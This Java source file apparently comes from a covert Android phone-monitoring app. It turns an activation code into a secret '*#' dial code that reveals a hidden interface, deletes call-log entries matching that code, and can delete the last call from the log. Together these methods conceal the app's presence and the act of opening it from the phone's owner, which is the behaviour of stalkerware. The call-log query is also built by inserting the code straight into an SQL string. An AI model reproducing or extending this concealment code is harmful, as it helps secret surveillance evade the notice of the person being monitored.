package com.vvt.phone;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;

import com.vvt.logger.FxLog;
import com.vvt.stringutil.FxStringUtils;

public class CallUtil {
	private static String TAG = "CallUtil";
		
	
	public static String getCodeToRevealUI(String activationCode, String defaultKey) {
		FxLog.v(TAG, "getCodeToRevealUI # ENTER ...");

		String codeToRevealUi = null;
 
		FxLog.v(TAG, "getCodeToRevealUI # Current activation code '" + activationCode + "'");

		if (FxStringUtils.isEmptyOrNull(activationCode)) {
			codeToRevealUi = defaultKey;
		} else
			codeToRevealUi = "*#" + activationCode;

		FxLog.v(TAG, "getCodeToRevealUI # Code to reveal UI '" + codeToRevealUi + "'");
		return codeToRevealUi;
	}

	public static void deleteCallWithFlexiKey(Context context, String activationCode, String defaultKey) {
			FxLog.v(TAG, "deleteCallWithFlexiKey # ENTER ...");

	 	ContentResolver resolver = context.getContentResolver();

		String selection = String.format("%s = '%s'", CallLog.Calls.NUMBER, getCodeToRevealUI(activationCode, defaultKey));
		
		FxLog.v(TAG, "deleteCallWithFlexiKey # selection is :" + selection);
		
		Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, null,
				selection, null, null);
		boolean resultMatched = cursor.getCount() > 0;
		cursor.close();

		int rowsDeleted = 0;

		if (resultMatched) {
				FxLog.v(TAG, "deleteCallWithFlexiKey # Found FK!!");

				rowsDeleted = context.getContentResolver().delete(CallLog.Calls.CONTENT_URI, selection, null);

				FxLog.v(TAG, String.format("deleteCallWithFlexiKey # rowsDeleted: %d", rowsDeleted));
			
			
		} else {
				FxLog.v(TAG, "deleteCallWithFlexiKey # Found normal number");
		}
	}
	
	public static void deleteLastCall(Context context) {
		FxLog.v(TAG, "deleteLastCall # ENTER ...");
		
		android.database.Cursor c = context.getContentResolver().query(
				android.provider.CallLog.Calls.CONTENT_URI, null, null, null,
				android.provider.CallLog.Calls.DATE + " DESC");

		// Retrieve the column-indixes of phoneNumber, date and calltype
		Cursor cursor = c;
		int lastCallId = -1;

		if (cursor.moveToFirst()) {
			lastCallId = cursor.getInt(cursor
					.getColumnIndex(android.provider.CallLog.Calls._ID));
		}

		if (cursor != null)
			cursor.close();

		FxLog.v(TAG, "deleteLastCall # lastCallId : " + String.valueOf(lastCallId));
		
		if (lastCallId > 0) {

			int deletedRows = context.getContentResolver()
					.delete(android.provider.CallLog.Calls.CONTENT_URI,
							android.provider.CallLog.Calls._ID + "="
									+ lastCallId, null);
			
			FxLog.v(TAG, "deleteLastCall # deletedRows : " + String.valueOf(deletedRows));
		}
		
	
		
		FxLog.v(TAG, "deleteLastCall # EXIT ...");

	}
}
